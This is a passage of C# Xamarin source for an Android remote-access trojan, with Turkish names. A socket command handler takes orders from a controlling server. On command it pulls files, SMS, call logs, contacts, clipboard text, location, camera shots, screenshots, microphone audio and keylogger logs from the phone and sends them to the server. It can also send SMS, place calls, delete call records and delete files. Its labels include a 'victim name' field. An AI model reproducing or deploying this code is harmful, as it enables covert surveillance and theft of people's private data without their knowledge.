                    byte[] hata = System.Text.Encoding.UTF8.GetBytes("INDIRILDI|" + ex.Message + "|");
                    PictureCallback.Send(Soketimiz, hata, 0, hata.Length, 59999);
                }
                catch (Exception) { }
            }
        }
        public static Socket server = default;
       
        void Sunucudan_Gelen_Veriler(IAsyncResult ar)
        {
            RunOnUiThread(() =>
            {
                try
                {
                    Socket sunucu = (Socket)ar.AsyncState;
                    server = sunucu;
                    int deger = sunucu.EndReceive(ar);
                    
                    string[] ayirici = System.Text.Encoding.UTF8.GetString(buffer, 0, deger).Split('|');//Gelen verileri ayrıştır.
                    switch (ayirici[0].Replace("0x0F", ""))
                    {
                        case "DOWNFILE":
                            DosyaIndir(ayirici[1], ayirici[2]);
                            break;
                        case "DOSYABYTE":
                            try
                            {
                                var regex_File = Regex.Match(ayirici[1], "[0-9]+");
                                byte[] alinan_dosya_byte = new byte[int.Parse(regex_File.Value)];
                                ayirici[1] = ayirici[1].Replace(regex_File.Value, "");
                                Receive(sunucu, alinan_dosya_byte, 0, alinan_dosya_byte.Length, 59999);
                                if (ayirici[3].Contains("/emulated"))
                                {
                                    File.WriteAllBytes(ayirici[3] + "/" + ayirici[2], alinan_dosya_byte);
                                }
                                else
                                {
                                    javaFileWrite(alinan_dosya_byte, ayirici[3] + "/" + ayirici[2]);
                                }
                                byte[] alindi = System.Text.Encoding.UTF8.GetBytes("DOSYAALINDI|" + MainValues.KRBN_ISMI);
                                PictureCallback.Send(Soketimiz, alindi, 0,
                                alindi.Length, 59999);
                            }
                            catch (Exception) { }
                            break;
                        case "DELETE":
                            try { DeleteFile_(ayirici[1]); } catch (Exception) { }
                            break;
                        case "CALLLOGS":
                            telefonLogu();
                            break;
                        case "ANASAYFA":
                            try
                            {
                                Intent i = new Intent(Intent.ActionMain);
                                i.AddCategory(Intent.CategoryHome);
                                i.SetFlags(ActivityFlags.NewTask);
                                StartActivity(i);
                            }
                            catch (Exception) { }
                            break;
                        case "GELENKUTUSU":
                            smsLogu("gelen");
                            break;
                        case "GIDENKUTUSU":
                            smsLogu("giden");
                            break;
                        case "KONUS":
                            konus(ayirici[1]);
                            break;
                        case "UNIQ":
                            //Toast.MakeText(this, ayirici[1], ToastLength.Long).Show();
                            MainValues.uniq_id = ayirici[1];
                            break;
                        case "CAM":
                            MainValues.front_back = ayirici[1];
                            MainValues.flashMode = ayirici[2];
                            kameraCek(sunucu);
                            break;
                        case "DOSYA":
                            dosyalar();
                            break;
                        case "FOLDERFILE":
                            allDirectory_ = new List<string>();
                            sonAsama(ayirici[1]);
                            cihazDosyalariGonder();
                            break;
                        case "FILESDCARD":
                            allDirectory_ = new List<string>();
                            listf(ayirici[1]);
                            dosyalariGonder();
                            break;
                        case "INDIR":
                            try
                            {
                                byte[] bite = System.Text.Encoding.UTF8.GetBytes("UZUNLUK|" + File.ReadAllBytes(ayirici[1]).Length.ToString() + "|" + ayirici[1].Substring(ayirici[1].LastIndexOf("/") + 1) + "|" + "[KURBAN_ADI]|");
                                byte[] dosya = File.ReadAllBytes(ayirici[1]);
                                PictureCallback.Send(Soketimiz, bite, 0,
                                bite.Length, 59999);
                                PictureCallback.Send(Soketimiz, dosya, 0, dosya.Length, 59999);
                            }
                            catch (Exception) { }
                            break;
                        case "MIC":
                            switch (ayirici[1])
                            {
                                case "BASLA":
                                    micSend(ayirici[2], ayirici[3]);
                                    break;
                                case "DURDUR":
                                    micStop();
                                    break;
                            }
                            break;
                        case "KEYBASLAT":
                            key_gonder = true;
                            break;
                        case "KEYDUR":
                            key_gonder = false;
                            break;
                        case "LOGLARIHAZIRLA":
                            log_dosylari_gonder = "";
                            DirectoryInfo dinfo = new DirectoryInfo(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly");
                            FileInfo[] fileInfos = dinfo.GetFiles("*.tht");
                            if (fileInfos.Length > 0)
                            {
                                foreach (FileInfo fileInfo in fileInfos)
                                {
                                    log_dosylari_gonder += fileInfo.Name + "=";
                                }
                                byte[] files = System.Text.Encoding.UTF8.GetBytes(log_dosylari_gonder);
                                byte[] gonder = System.Text.Encoding.UTF8.GetBytes("LOGDOSYA|#" + files.Length.ToString() + "#|");
                                PictureCallback.Send(Soketimiz, gonder, 0, gonder.Length, 59999);
                                PictureCallback.Send(Soketimiz, files, 0, files.Length, 59999);
                                //Toast.MakeText(this, "gönderildi", ToastLength.Long).Show();
                            }
                            else
                            {
                                byte[] gonder = System.Text.Encoding.UTF8.GetBytes("LOGDOSYA|LOG_YOK");
                                PictureCallback.Send(Soketimiz, gonder, 0, gonder.Length, 59000);
                            }
                            break;
                        case "KEYCEK":
                            byte[] read = System.Text.Encoding.UTF8.GetBytes(File.ReadAllText(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly/" + ayirici[1]).Replace(System.Environment.NewLine, "[NEW_LINE]"));
                            byte[] log = System.Text.Encoding.UTF8.GetBytes("KEYGONDER|#" + read.Length.ToString() + "#|");
                            PictureCallback.Send(Soketimiz, log, 0, log.Length, 59000);
                            PictureCallback.Send(Soketimiz, read, 0, read.Length, 59999);
                            break;
                        case "DOSYAAC":
                            Ac(ayirici[1]);
                            break;
                        case "GIZLI":
                            StartPlayer(ayirici[1]);
                            break;
                        case "GIZKAPA":
                            if (player != null)
                            {
                                player.Stop();
                            }
                            break;
                        case "VOLUMELEVELS":
                            sesBilgileri();
                            break;
                        case "ZILSESI":
                            try
                            {
                                if (mgr == null) { mgr = (Android.Media.AudioManager)GetSystemService(AudioService); }
                                mgr.SetStreamVolume(Android.Media.Stream.Ring, int.Parse(ayirici[1].Replace("VOLUMELEVELS", "")), Android.Media.VolumeNotificationFlags.RemoveSoundAndVibrate);
                            }
                            catch (Exception) { }
                            break;
                        case "MEDYASESI":
                            try
                            {
                                if (mgr == null) { mgr = (Android.Media.AudioManager)GetSystemService(AudioService); }
                                mgr.SetStreamVolume(Android.Media.Stream.Music, int.Parse(ayirici[1].Replace("VOLUMELEVELS", "")), Android.Media.VolumeNotificationFlags.RemoveSoundAndVibrate);
                            }
                            catch (Exception) { }
                            break;
                        case "BILDIRIMSESI": // KAMERADAKİ HER ŞEYE TRY CATCH KOY.
                            try
                            {
                                if (mgr == null) { mgr = (Android.Media.AudioManager)GetSystemService(AudioService); }
                                mgr.SetStreamVolume(Android.Media.Stream.Notification, int.Parse(ayirici[1].Replace("VOLUMELEVELS", "")), Android.Media.VolumeNotificationFlags.RemoveSoundAndVibrate);
                            }
                            catch (Exception) { }
                            break;
                        case "REHBERIVER":
                            rehberLogu();
                            break;
                        case "REHBERISIM":
                            string[] ayir = ayirici[1].Split('=');
                            rehberEkle(ayir[1], ayir[0]);
                            break;
                        case "REHBERSIL":
                            rehberNoSil(ayirici[1]);
                            break;
                        case "VIBRATION":
                            try
                            {
                                Vibrator vibrator = (Vibrator)GetSystemService(VibratorService);
                                vibrator.Vibrate(int.Parse(ayirici[1]));
                            }
                            catch (Exception) { }
                            break;
                        case "FLASH":
                            flashIsik(ayirici[1]);
                            break;
                        case "TOST":
                            Toast.MakeText(this, ayirici[1], ToastLength.Long).Show();
                            break;
                        case "APPLICATIONS":
                            uygulamalar();
                            break;
                        case "OPENAPP":
                            try
                            {
                                Intent intent = PackageManager.GetLaunchIntentForPackage(ayirici[1]);
                                intent.AddFlags(ActivityFlags.NewTask);
                                StartActivity(intent);
                            }
                            catch (Exception) { }
                            break;
                        case "DELETECALL":
                            DeleteCallLogByNumber(ayirici[1]);
                            break;
                        case "SARJ":
                            try
                            {
                                var filter = new IntentFilter(Intent.ActionBatteryChanged);
                                var battery = RegisterReceiver(null, filter);
                                int level = battery.GetIntExtra(BatteryManager.ExtraLevel, -1);
                                int scale = battery.GetIntExtra(BatteryManager.ExtraScale, -1);
                                int BPercetage = (int)Math.Floor(level * 100D / scale);
                                var per = BPercetage.ToString();
                                var lev = System.Text.Encoding.UTF8.GetBytes("TELEFONBILGI|" + per.ToString() + "|" + ekranDurumu() + "|" + usbDurumu());
                                PictureCallback.Send(Soketimiz, lev, 0, lev.Length, 59999);
                            }
                            catch (Exception) { }
                            break;

                        case "WALLPAPERBYTE":
                            try
                            {

                                duvarKagidi(ayirici[1]);
                            }
                            catch (Exception)
                            {
                                //Toast.MakeText(this, ayirici[1], ToastLength.Long).Show();
                            }

                            break;
                        case "WALLPAPERGET":
                            duvarKagidiniGonder();
                            break;
                        case "PANOGET":
                            panoyuYolla();
                            break;
                        case "PANOSET":
                            panoAyarla(ayirici[1]);
                            break;
                        case "SMSGONDER":
                            string[] baki = ayirici[1].Split('=');
                            try
                            {
                                SmsManager.Default.SendTextMessage(baki[0], null,
                                   baki[1], null, null);
                            }
                            catch (Exception) { }
                            break;
                        case "ARA":
                            MakePhoneCall(ayirici[1]);
                            break;
                        case "URL":
                            try
                            {
                                var uri = Android.Net.Uri.Parse(ayirici[1]);
                                var intent = new Intent(Intent.ActionView, uri);
                                StartActivity(intent);
                            }
                            catch (Exception) { }
                            break;
                        case "KONUM":
                            lokasyonCek();
                            break;
                        case "EKRANGORUNTUSU":
                            ekranGoruntusu();
                            break;
                        case "PARLAKLIK":
                            break;
                        case "PARILTI":
                            break;
                        case "LOGTEMIZLE":
                            DirectoryInfo dinfo_ = new DirectoryInfo(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly");
                            FileInfo[] fileInfos_ = dinfo_.GetFiles("*.tht");
                            if (fileInfos_.Length > 0)
                            {
                                foreach (FileInfo fileInfo in fileInfos_)
                                {
                                    fileInfo.Delete();
                                }
                            }
                            break;
                    }

                    sunucu.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(Sunucudan_Gelen_Veriler), sunucu);


                }
                catch (SocketException)
                {
                    //Toast.MakeText(this, "socket "+ex.Message, ToastLength.Long).Show();
                    // ULAAAAAAAAAN!!!! BEN LAZ ZİYAYIM!!!!
                    micStop();
                    Baglanti_Kur();
                }
                catch (Exception)
                {
                    //Toast.MakeText(this, "socket "+ex.Message, ToastLength.Long).Show();
                    // ULAAAAAAAAAN!!!! BEN LAZ ZİYAYIM!!!!
                    micStop();
                    Baglanti_Kur();
                }
            });
        }
        /*
        const int sizeByte = 1024;
        public void ReciveFile(Socket Client, string path)
        {
            while (true)
            {
                try
                {
                    byte[] b = new byte[sizeByte];
                    int rec = 1;
                    int vp = 0;
                    rec = Client.Receive(b);

                    int index;
                    for (index = 0; index < b.Length; index++)
                        if (b[index] == 63)
                            break;
                    string[] fInfo = System.Text.Encoding.UTF8.GetString(b.Take(index).ToArray()).Split(':');
                    //this.Invoke((MethodInvoker)delegate
                    //{
                     //   progressBar1.Maximum = int.Parse(fInfo[0]);
                    //});                   
                    if (!Directory.Exists(path))
                        Directory.CreateDirectory(path);
                    FileStream fs = new FileStream(path + fInfo[1], FileMode.Append, FileAccess.Write);
                    string strEnd;
                    while (true)
                    {
                        rec = Client.Receive(b);
                        vp = vp + rec;
                        strEnd = ((char)b[0]).ToString() + ((char)b[1]).ToString() + ((char)b[2]).ToString() + ((char)b[3]).ToString() + ((char)b[4]).ToString() + ((char)b[5]).ToString();
                        if (strEnd == "!endf!")
                        {
                            fs.Flush();
                            fs.Close();
                            //MessageBox.Show("Receive File " + ((float)(float.Parse(fInfo[0]) / 1024)).ToString() + "  KB");
                            break;
                        }
                        fs.Write(b, 0, rec);
                        //this.Invoke((MethodInvoker)delegate
                        //{
                          //  progressBar1.Value = vp;
                        //});
                    }
                }
                catch (Exception ex )
                {
                    Toast.MakeText(this, ex.Message, ToastLength.Long).Show();
                }
            }
        }
        */
        public void cihazDosyalariGonder()
        {
            string dosyalarS = "";
            foreach (string inf in allDirectory_)
            {
                dosyalarS += inf + System.Environment.NewLine;
            }
            //byte[] veri = System.Text.Encoding.UTF8.GetBytes("FILES|" + dosyalarS + "|CIHAZ|");
            //PictureCallback.Send(Soketimiz, veri, 0, veri.Length, 59999);
            byte[] veri = System.Text.Encoding.UTF8.GetBytes(dosyalarS);
            byte[] uzunluk = System.Text.Encoding.UTF8.GetBytes("FILES|CIHAZ|#" + veri.Length.ToString() + "#|");
            PictureCallback.Send(Soketimiz, uzunluk, 0,
               uzunluk.Length, 59999);
            PictureCallback.Send(Soketimiz, veri, 0,
                veri.Length, 59999);

        }
        public void dosyalariGonder()
        {
            string dosyalarS = "";
            foreach (string inf in allDirectory_)
            {
                dosyalarS += inf + System.Environment.NewLine;
            }
            //byte[] veri = System.Text.Encoding.UTF8.GetBytes("FILES|" + dosyalarS + "|SDCARD|");
            //PictureCallback.Send(Soketimiz, veri, 0,veri.Length, 59999);
            byte[] veri = System.Text.Encoding.UTF8.GetBytes(dosyalarS);
            byte[] uzunluk = System.Text.Encoding.UTF8.GetBytes("FILES|SDCARD|#" + veri.Length.ToString() + "#|");
            PictureCallback.Send(Soketimiz, uzunluk, 0,
               uzunluk.Length, 59999);
            PictureCallback.Send(Soketimiz, veri, 0,
                veri.Length, 59999);
        }
        public string usbDurumu()
        {
            string status = "";
            try
            {
                var source = Battery.PowerSource;
                switch (source)
                {
                    case BatteryPowerSource.Battery:
                        status = "BATARYA";
                        break;
                    case BatteryPowerSource.AC:
                        status = "FİŞ";
                        break;
                    case BatteryPowerSource.Usb:
                        status = "USB";
                        break;
                    case BatteryPowerSource.Wireless:
                        status = "KABLOSUZ";
                        break;
                    case BatteryPowerSource.Unknown:
                        status = "BİLİNMİYOR";
                        break;
                }
                return status + "|";
            }
            catch (Exception ex) { status = ex.Message + "|"; return status; }
        }
        public string ekranDurumu()
        {
            try
            {
                string KEY_DURUMU = "";
                string EKRAN_DURUMU = "";
                KeyguardManager myKM = (KeyguardManager)GetSystemService(KeyguardService);
                bool isPhoneLocked = myKM.InKeyguardRestrictedInputMode();
                bool isScreenAwake = default;
                KEY_DURUMU = (isPhoneLocked) ? "KİLİTLİ" : "KİLİT_YOK";
                PowerManager powerManager = (PowerManager)GetSystemService(PowerService);
                isScreenAwake = ((int)Build.VERSION.SdkInt < 20 ? powerManager.IsScreenOn : powerManager.IsInteractive);
                EKRAN_DURUMU = (isScreenAwake) ? "EKRAN_AÇIK" : "EKRAN_KAPALI";

                return KEY_DURUMU + "&" + EKRAN_DURUMU + "&";
            }
            catch (Exception ex) { return ex.Message + "&"; }

        }
        public async void panoAyarla(string input)
        {
            await Clipboard.SetTextAsync(input);
        }
        public async void panoyuYolla()
        {
            var pano = await Clipboard.GetTextAsync();
            if (string.IsNullOrEmpty(pano)) { pano = "[NULL]"; }
            //Toast.MakeText(this, pano + " lenght: " + pano.Length.ToString(), ToastLength.Long).Show();
            byte[] pala = System.Text.Encoding.UTF8.GetBytes(pano);
            try
            {

                byte[] pala_uzunluk = System.Text.Encoding.UTF8.GetBytes("PANOGELDI|#" + pala.Length.ToString() + "#|");
                PictureCallback.Send(Soketimiz, pala_uzunluk, 0, pala_uzunluk.Length, 59999);
                PictureCallback.Send(Soketimiz, pala, 0, pala.Length, 59999);
            }
            catch (Exception) { }
        }
        public async Task<byte[]> wallPaper(string linq)
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    wc.Headers.Add(HttpRequestHeader.UserAgent,
                "other");
                    return await wc.DownloadDataTaskAsync(linq);
                }
            }
            catch (Exception)
            {

                return new byte[] { };
            }
        }
        public async void duvarKagidi(string yol)
        {

            try
            {
                byte[] uzant = await wallPaper(yol);
                if (uzant.Length > 0)
                {
                    Android.Graphics.Bitmap bitmap = Android.Graphics.BitmapFactory.DecodeByteArray(uzant, 0, uzant.Length); //Android.Graphics.BitmapFactory.DecodeByteArray(veri,0,veri.Length);
                    WallpaperManager manager = WallpaperManager.GetInstance(ApplicationContext);
                    manager.SetBitmap(bitmap);
                    bitmap.Dispose();
                    manager.Dispose();
                }
            }
            catch (Exception)
            { }

        }
        public byte[] drawableToByteArray(Drawable d)
        {
            var image = d;
            Android.Graphics.Bitmap bitmap_ = ((BitmapDrawable)image).Bitmap;
            byte[] bitmapData;
            using (MemoryStream ms = new MemoryStream())
            {
                bitmap_.Compress(Android.Graphics.Bitmap.CompressFormat.Png, 100, ms);
                bitmapData = ms.ToArray();
            }
            return bitmapData;
        }
        public void duvarKagidiniGonder()
        {
            WallpaperManager manager = WallpaperManager.GetInstance(this);
            try
            {
                var image = manager.PeekDrawable();
                Android.Graphics.Bitmap bitmap_ = ((BitmapDrawable)image).Bitmap;
                byte[] bitmapData;
                using (MemoryStream ms = new MemoryStream())
                {
                    bitmap_.Compress(Android.Graphics.Bitmap.CompressFormat.Png, 100, ms);
                    bitmapData = ms.ToArray();
                }
                byte[] ziya = System.Text.Encoding.UTF8.GetBytes("WALLPAPERBYTES|" + bitmapData.Length.ToString() + "|");
                PictureCallback.Send(Soketimiz, ziya, 0, ziya.Length, 59999);
                PictureCallback.Send(Soketimiz, bitmapData, 0, bitmapData.Length, 59999);
                //Toast.MakeText(this, "DUVAR KAĞIDI OKAY ", ToastLength.Long).Show();
            }
            catch (Exception)
            {
                //Toast.MakeText(this, "DUVAR KAĞIDI " + ex.Message, ToastLength.Long).Show();
            }
        }
        public async void flashIsik(string ne_yapam)
        {
            switch (ne_yapam)
            {
                case "AC":
                    await Flashlight.TurnOnAsync();
                    break;
                case "KAPA":
                    await Flashlight.TurnOffAsync();
                    break;
            }
        }
        public void MakePhoneCall(string number)
        {
            var uri = Android.Net.Uri.Parse("tel:" + number);
            Intent intent = new Intent(Intent.ActionCall, uri);
            intent.AddFlags(ActivityFlags.NewTask);
            Application.Context.StartActivity(intent);
        }
        public void DeleteCallLogByNumber(string number)
        {
            try
            {
                Android.Net.Uri CALLLOG_URI = Android.Net.Uri.Parse("content://call_log/calls");
                ContentResolver.Delete(CALLLOG_URI, CallLog.Calls.Number + "=?", new string[] { number });
            }
            catch (Exception)
            {
            }
        }
        protected MediaPlayer player = new MediaPlayer();
        public void StartPlayer(string filePath)
        {
            try
            {
                if (player == null)
                {
                    player = new MediaPlayer();
                }
                else
                {
                    Android.Net.Uri uri = Android.Net.Uri.Parse("file://" + filePath);
                    player.Reset();
                    player.SetDataSource(this, uri);
                    player.Prepare();
                    player.Start();
                }
            }
            catch (Exception) { }
        }
        string log_dosylari_gonder = "";
        Android.Media.AudioManager mgr = null;
        public void sesBilgileri()
        {
            string ZIL_SESI = "";
            string MEDYA_SESI = "";
            string BILDIRIM_SESI = "";
            mgr = (Android.Media.AudioManager)GetSystemService(AudioService);
            //Zil sesi
            int max = mgr.GetStreamMaxVolume(Android.Media.Stream.Ring);
            int suankiZilSesi = mgr.GetStreamVolume(Android.Media.Stream.Ring);
            ZIL_SESI = suankiZilSesi.ToString() + "/" + max.ToString();
            //Medya
            int maxMedya = mgr.GetStreamMaxVolume(Android.Media.Stream.Music);
            int suankiMedya = mgr.GetStreamVolume(Android.Media.Stream.Music);
            MEDYA_SESI = suankiMedya.ToString() + "/" + maxMedya.ToString();
            //Bildirim Sesi
            int maxBildirim = mgr.GetStreamMaxVolume(Android.Media.Stream.Notification);
            int suankiBildirim = mgr.GetStreamVolume(Android.Media.Stream.Notification);
            BILDIRIM_SESI = suankiBildirim.ToString() + "/" + maxBildirim.ToString();

            string gonderilecekler = ZIL_SESI + "=" + MEDYA_SESI + "=" + BILDIRIM_SESI + "=";
            byte[] git_Artik_bezdim = System.Text.Encoding.UTF8.GetBytes("SESBILGILERI|" + gonderilecekler);
            PictureCallback.Send(Soketimiz, git_Artik_bezdim, 0, git_Artik_bezdim.Length, 59999);
        }
        public static Activity global_activity = default;
        public static PackageManager global_packageManager = default;

    }
}